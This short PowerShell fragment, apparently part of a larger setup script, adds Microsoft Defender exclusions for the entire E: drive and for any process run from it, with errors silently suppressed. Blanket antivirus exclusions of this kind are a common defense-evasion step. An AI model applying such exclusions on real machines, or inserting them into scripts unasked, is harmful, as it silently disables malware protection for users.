Write-Host "    [+] Adding exclusions for E drive"
$exclusionPaths = @("E:\", "E:\*")
foreach ($path in $exclusionPaths) {
    if ($path -eq "E:\") {
        Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue
    } else {
        Add-MpPreference -ExclusionProcess $path -ErrorAction SilentlyContinue
    }
}
